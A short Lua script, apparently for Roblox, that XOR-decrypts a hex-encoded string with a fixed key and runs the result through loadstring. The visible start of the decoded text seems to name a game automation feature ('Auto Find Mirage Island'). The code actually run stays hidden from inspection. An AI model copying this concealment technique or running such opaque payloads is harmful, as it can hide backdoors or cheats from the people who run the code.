local A="5cbcbf68cfa666429d573a3720f2c93b45a7b329e5ef451bc654322824a88e5a79a0b068cde20953b56d3a2e20f28d1b5ca0b974a9e05e11856d32352befa64071a3ac65daae7d1e8a6c3e7606ae871652b2bf628a8c581a8a7f750931ae9f1f0d85bd65d6e31642926b2e3f4fa68d5a73b2b065c1e74814c66d333f2bef9f1b43b8f27ad3e75c11ce5a3a3629ad8a195bffaf6ccfe0052c92782f3f6cef8e1454d9b967c78c591a926c29346582e1"
local K={48,211,220,9,163,134,43,127,230,25,91,90,69,207,235,122}
local O=table.create(#A/2)
local N=0
for I=1,#A,2 do
N=N+1
O[N]=string.char(bit32.bxor(tonumber(string.sub(A,I,I+1),16),K[(N-1)%#K+1]))
end
return loadstring(table.concat(O))()
